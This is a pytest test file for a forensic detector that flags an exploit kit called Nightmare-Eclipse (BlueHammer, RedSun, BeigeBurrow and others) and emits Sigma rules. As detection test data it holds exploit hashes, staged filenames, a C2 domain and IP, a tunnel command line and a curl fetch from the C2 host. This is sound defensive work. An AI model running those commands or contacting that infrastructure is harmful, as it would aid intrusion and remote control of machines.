"""Nightmare-Eclipse exploit-kit detector (BlueHammer / RedSun / etc.)."""

from __future__ import annotations

import pytest

from digger.core.evidence import Artifact, EvidenceStore
from digger.detectors.nightmare_eclipse import NightmareEclipseDetector
from digger.genrule.sigma import finding_to_sigma


def _store(tmp_path):
    return EvidenceStore(tmp_path / "evidence.db")


def _proc(store, pid, name, cmdline, *, exe=None, sha256=None,
          connections=None, username="user"):
    cm = cmdline if isinstance(cmdline, list) else [cmdline] if cmdline else []
    data = {
        "pid": pid, "ppid": 1, "name": name,
        "exe": exe or f"C:\\Users\\u\\{name}",
        "cmdline": cm, "username": username,
        "connections": connections or [],
        "open_files": [],
    }
    if sha256:
        data["exe_sha256"] = sha256
    store.add_artifact(Artifact(
        collector="processes", category="process",
        subject=f"pid={pid} {name}", data=data,
    ))


# ---- N1 hash IOCs ----------------------------------------------------- #


_SNEK_SHA256 = "c6baa5ec9ea2c2802a90acad5a53453d176a02e04a31ac8e9b7b34b5e3329b84"
_AGENT_SHA256 = "a2b6c7a9c4490df70de3cdbfa5fc801a3e1cf6a872749259487e354de2876b7c"


def test_known_sha256_bluehammer_critical(tmp_path):
    store = _store(tmp_path)
    _proc(store, 100, "SNEK_BlueWarHammer.exe", ["SNEK_BlueWarHammer.exe"],
          exe="C:\\Users\\u\\Downloads\\SNEK_BlueWarHammer.exe",
          sha256=_SNEK_SHA256)
    findings = list(NightmareEclipseDetector().detect(store))
    hits = [f for f in findings if f.evidence.get("kind") == "hash"]
    assert hits, [f.title for f in findings]
    assert hits[0].severity == "critical"
    assert hits[0].evidence.get("exploit") == "BlueHammer"
    assert hits[0].evidence.get("patch_status").startswith("patched")
    assert hits[0].mitre == "T1068"
    store.close()


def test_known_sha256_beigeburrow_critical(tmp_path):
    store = _store(tmp_path)
    _proc(store, 101, "agent.exe", ["agent.exe"],
          exe="C:\\ProgramData\\agent.exe",
          sha256=_AGENT_SHA256)
    findings = list(NightmareEclipseDetector().detect(store))
    hits = [f for f in findings if f.evidence.get("kind") == "hash"
            and f.evidence.get("exploit") == "BeigeBurrow"]
    assert hits, [f.title for f in findings]
    assert hits[0].severity == "critical"
    # BeigeBurrow is a tunnel, so T1572
    assert hits[0].mitre == "T1572"
    assert hits[0].evidence.get("patch_status") == "unpatched"
    store.close()


def test_unrelated_hash_not_flagged(tmp_path):
    store = _store(tmp_path)
    _proc(store, 102, "calc.exe", ["calc.exe"],
          exe="C:\\Windows\\System32\\calc.exe",
          sha256="0" * 64)
    findings = list(NightmareEclipseDetector().detect(store))
    assert not [f for f in findings if f.evidence.get("kind") == "hash"]
    store.close()


# ---- N2 operator-staged filenames ------------------------------------- #


@pytest.mark.parametrize("name", [
    "FunnyApp.exe", "RedSun.exe", "undef.exe", "z.exe",
    "SNEK_BlueWarHammer.exe", "agent.exe",
])
def test_exploit_filename_in_recent_files_critical(tmp_path, name):
    store = _store(tmp_path)
    store.add_artifact(Artifact(
        collector="recent_files", category="filesystem",
        subject="recent:/Users",
        data={
            "location": "C:\\Users",
            "entries": [
                {"path": f"C:\\Users\\victim\\Downloads\\{name}",
                 "size": 1024},
            ],
        },
    ))
    findings = list(NightmareEclipseDetector().detect(store))
    hits = [f for f in findings if f.evidence.get("kind") == "filename"]
    assert hits, [f.title for f in findings]
    assert hits[0].severity == "critical"
    assert hits[0].evidence.get("basename") == name.lower()
    store.close()


def test_innocuous_filename_not_flagged(tmp_path):
    store = _store(tmp_path)
    store.add_artifact(Artifact(
        collector="recent_files", category="filesystem",
        subject="recent:/Users",
        data={
            "location": "C:\\Users",
            "entries": [
                {"path": "C:\\Users\\u\\Downloads\\report.pdf", "size": 1024},
            ],
        },
    ))
    findings = list(NightmareEclipseDetector().detect(store))
    assert not [f for f in findings if f.evidence.get("kind") == "filename"]
    store.close()


# ---- N3 cmdline shapes ------------------------------------------------ #


def test_beigeburrow_tunnel_cmdline_critical(tmp_path):
    store = _store(tmp_path)
    _proc(store, 200, "agent.exe",
          ["agent.exe", "-server", "staybud.dpdns.org:443", "-hide"])
    findings = list(NightmareEclipseDetector().detect(store))
    hits = [f for f in findings if f.evidence.get("kind") == "cmdline"
            and f.evidence.get("signature") == "beigeburrow_tunnel"]
    assert hits, [f.title for f in findings]
    assert hits[0].severity == "critical"
    assert hits[0].evidence.get("exploit") == "BeigeBurrow"
    assert hits[0].mitre == "T1572"
    store.close()


def test_undef_help_cmdline_critical(tmp_path):
    store = _store(tmp_path)
    _proc(store, 201, "undef.exe", ["undef.exe", "-h"])
    findings = list(NightmareEclipseDetector().detect(store))
    hits = [f for f in findings if f.evidence.get("kind") == "cmdline"]
    assert hits
    assert any(f.evidence.get("exploit") == "UnDefend" for f in hits)
    store.close()


def test_undef_misspelled_agressive_flag_critical(tmp_path):
    """The operator-observed misspelled flag, verbatim from Huntress."""
    store = _store(tmp_path)
    _proc(store, 202, "undef.exe", ["undef.exe", "-agressive"])
    findings = list(NightmareEclipseDetector().detect(store))
    hits = [f for f in findings if f.evidence.get("kind") == "cmdline"
            and f.evidence.get("exploit") == "UnDefend"]
    assert hits
    store.close()


def test_redsun_invocation_critical(tmp_path):
    store = _store(tmp_path)
    _proc(store, 203, "RedSun.exe", ["RedSun.exe", "--target", "system32"])
    findings = list(NightmareEclipseDetector().detect(store))
    hits = [f for f in findings if f.evidence.get("kind") == "cmdline"
            and f.evidence.get("exploit") == "RedSun"]
    assert hits
    assert hits[0].severity == "critical"
    store.close()


def test_agent_exe_without_tunnel_flags_not_beigeburrow(tmp_path):
    """agent.exe in cmdline alone (no -server X:443 -hide) shouldn't
    fire the beigeburrow_tunnel signature."""
    store = _store(tmp_path)
    _proc(store, 204, "agent.exe", ["agent.exe", "--help"])
    findings = list(NightmareEclipseDetector().detect(store))
    bb = [f for f in findings if f.evidence.get("signature") == "beigeburrow_tunnel"]
    assert not bb
    store.close()


# ---- N4 C2 markers ---------------------------------------------------- #


def test_c2_domain_in_process_cmdline_critical(tmp_path):
    store = _store(tmp_path)
    _proc(store, 300, "curl.exe",
          ["curl.exe", "-sSL", "https://staybud.dpdns.org/x"])
    findings = list(NightmareEclipseDetector().detect(store))
    hits = [f for f in findings if f.evidence.get("kind") == "c2"
            and f.evidence.get("domain") == "staybud.dpdns.org"]
    assert hits, [f.title for f in findings]
    assert hits[0].severity == "critical"
    assert hits[0].mitre == "T1572"
    store.close()


def test_c2_source_ip_in_connection_table_critical(tmp_path):
    store = _store(tmp_path)
    _proc(store, 301, "agent.exe", ["agent.exe"],
          connections=[{"raddr": "78.29.48.29", "rport": 443,
                        "status": "ESTABLISHED"}])
    findings = list(NightmareEclipseDetector().detect(store))
    hits = [f for f in findings if f.evidence.get("kind") == "c2"
            and f.evidence.get("remote_ip") == "78.29.48.29"]
    assert hits, [f.title for f in findings]
    assert hits[0].severity == "critical"
    store.close()


def test_c2_dns_history_critical(tmp_path):
    store = _store(tmp_path)
    store.add_artifact(Artifact(
        collector="dns", category="network",
        subject="dns:cache",
        data={"host": "staybud.dpdns.org", "entries": []},
    ))
    findings = list(NightmareEclipseDetector().detect(store))
    hits = [f for f in findings if f.evidence.get("kind") == "c2"]
    assert hits
    assert hits[0].severity == "critical"
    store.close()


# ---- N4c Defender quarantine markers ---------------------------------- #


def test_defender_quarantine_name_flagged(tmp_path):
    """Any artifact containing the Defender quarantine string fires."""
    store = _store(tmp_path)
    # Put it in a fake event-log style artifact
    store.add_artifact(Artifact(
        collector="defender", category="logs",
        subject="defender_history",
        data={"event": "ThreatDetected",
              "ThreatName": "Exploit:Win32/DfndrPEBluHmr.BZ",
              "ResourceUri": "file:///C:/Users/u/Pictures/FunnyApp.exe"},
    ))
    findings = list(NightmareEclipseDetector().detect(store))
    hits = [f for f in findings if f.evidence.get("kind") == "defender_quarantine"]
    assert hits, [f.title for f in findings]
    assert hits[0].severity == "critical"
    assert "DfndrPEBluHmr" in hits[0].evidence.get("quarantine_name", "")
    store.close()


# ---- YellowKey BitLocker advisory ------------------------------------- #


def test_bitlocker_tpm_only_yellowkey_advisory(tmp_path):
    store = _store(tmp_path)
    # Fake bitlocker artifact showing tpm-only protector
    store.add_artifact(Artifact(
        collector="bitlocker", category="config",
        subject="bitlocker:C:",
        data={"drive": "C:", "protector_type": "tpm",
              "protection_status": "On"},
    ))
    findings = list(NightmareEclipseDetector().detect(store))
    hits = [f for f in findings if f.evidence.get("kind") == "yellowkey_config"]
    assert hits, [f.title for f in findings]
    assert hits[0].severity == "medium"
    assert hits[0].evidence.get("exploit") == "YellowKey"
    store.close()


# ---- mitigation routing ----------------------------------------------- #


def test_mitigation_block_for_patched_exploit_mentions_platform_version(tmp_path):
    store = _store(tmp_path)
    _proc(store, 400, "SNEK_BlueWarHammer.exe", ["SNEK_BlueWarHammer.exe"],
          exe="C:\\test\\SNEK_BlueWarHammer.exe",
          sha256=_SNEK_SHA256)
    f = next(iter(NightmareEclipseDetector().detect(store)))
    mit = f.evidence.get("mitigation_commands") or ""
    assert "4.18.26050.3011" in mit
    assert "Get-MpComputerStatus" in mit
    store.close()


def test_mitigation_block_for_unpatched_mentions_layered_defenses(tmp_path):
    store = _store(tmp_path)
    _proc(store, 401, "RedSun.exe", ["RedSun.exe", "--go"])
    f = next(iter(NightmareEclipseDetector().detect(store)))
    mit = f.evidence.get("mitigation_commands") or ""
    assert ("UNPATCHED" in mit or "unpatched" in mit
            or "layered" in mit.lower())
    store.close()


# ---- Sigma ------------------------------------------------------------ #


def test_sigma_per_finding_for_hash(tmp_path):
    store = _store(tmp_path)
    _proc(store, 500, "SNEK_BlueWarHammer.exe", ["SNEK_BlueWarHammer.exe"],
          sha256=_SNEK_SHA256)
    f = next(iter(NightmareEclipseDetector().detect(store)))
    rule = finding_to_sigma({
        "detector": f.detector, "title": f.title, "summary": f.summary,
        "severity": f.severity, "evidence": f.evidence,
        "finding_uuid": "ne-1", "mitre": f.mitre,
    }, case_id="t")
    assert rule is not None
    assert "attack.t1068" in rule["tags"]
    assert _SNEK_SHA256 in str(rule["detection"]["selection"])
    store.close()


def test_sigma_per_finding_for_c2_ip(tmp_path):
    store = _store(tmp_path)
    _proc(store, 501, "agent.exe", ["agent.exe"],
          connections=[{"raddr": "78.29.48.29", "rport": 443,
                        "status": "ESTABLISHED"}])
    f = next(iter(NightmareEclipseDetector().detect(store)))
    rule = finding_to_sigma({
        "detector": f.detector, "title": f.title, "summary": f.summary,
        "severity": f.severity, "evidence": f.evidence,
        "finding_uuid": "ne-2", "mitre": f.mitre,
    }, case_id="t")
    assert rule is not None
    assert rule["logsource"]["category"] == "network_connection"
    assert rule["detection"]["selection"].get("DestinationIp") == "78.29.48.29"
    store.close()


def test_sigma_template_present():
    tpl = NightmareEclipseDetector().to_sigma_template()
    assert tpl is not None
    assert tpl["level"] == "critical"
    for tag in ("attack.t1068", "attack.t1562.001", "attack.t1572"):
        assert tag in tpl["tags"]
    sels = [k for k in tpl["detection"] if k.startswith("selection_")]
    assert len(sels) >= 5


# ---- registration ----------------------------------------------------- #


def test_detector_registered():
    from digger.detectors import all_detectors
    assert "nightmare_eclipse" in [d.name for d in all_detectors()]
